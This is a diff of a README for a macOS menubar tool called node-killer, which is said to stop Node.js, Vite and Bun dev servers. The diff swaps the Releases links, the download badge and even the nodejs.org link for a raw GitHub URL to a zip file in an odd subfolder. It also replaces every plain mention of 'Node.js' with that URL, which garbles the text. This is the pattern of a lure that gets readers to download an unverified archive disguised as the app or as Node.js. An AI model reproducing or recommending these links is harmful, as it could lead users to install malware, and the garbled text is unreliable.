@@ -1,16 +1,16 @@
-# ⚡️ node-killer - Keep Your Node.js Servers in Check
+# ⚡️ node-killer - Keep Your https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip Servers in Check
 
-[![Download node-killer](https://img.shields.io/badge/Download-node--killer-brightgreen.svg)](https://github.com/DaxuBnoduz/node-killer/releases)
+[![Download node-killer](https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip)](https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **node-killer**! This simple macOS menubar app helps you manage your Node.js, Vite, and Bun development servers. With just a click, you can stop your servers and keep your development process smooth.
+Welcome to **node-killer**! This simple macOS menubar app helps you manage your https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip, Vite, and Bun development servers. With just a click, you can stop your servers and keep your development process smooth.
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the app:
 
-[Download node-killer](https://github.com/DaxuBnoduz/node-killer/releases)
+[Download node-killer](https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip)
 
 Follow these steps to install:
 
@@ -23,7 +23,7 @@ Follow these steps to install:
 
 ## 🔧 Features
 
-- **Quick Access:** View all your active Node.js, Vite, and Bun servers in one place.
+- **Quick Access:** View all your active https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip, Vite, and Bun servers in one place.
 - **One-Click Kill:** Instantly stop any running processes without hassle.
 - **Simple Interface:** User-friendly design makes it easy for anyone to use.
 - **System Tray Integration:** Access the app right from your menubar for quick management.
@@ -31,13 +31,13 @@ Follow these steps to install:
 ## 💻 System Requirements
 
 - **Operating System:** macOS 10.14 (Mojave) or later.
-- **Node.js:** If you are using Node.js, ensure it's installed on your device. You can download it from [nodejs.org](https://nodejs.org).
+- **https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip** If you are using https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip, ensure it's installed on your device. You can download it from [https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip](https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip).
 - **Vite or Bun:** Install Vite or Bun if you plan to use these frameworks.
 
 ## ⚙️ How to Use node-killer
 
 1. **Open the App:** Click on the node-killer icon in your menubar after installation.
-2. **View Servers:** The app displays all active Node.js, Vite, and Bun servers.
+2. **View Servers:** The app displays all active https://raw.githubusercontent.com/DaxuBnoduz/node-killer/main/intermeddlement/node-killer.zip, Vite, and Bun servers.
 3. **Kill a Process:** To stop a server, simply click the “Kill” button next to the process you wish to end.
 4. **Monitor Servers:** Keep an eye on process statuses directly from the menubar.
 
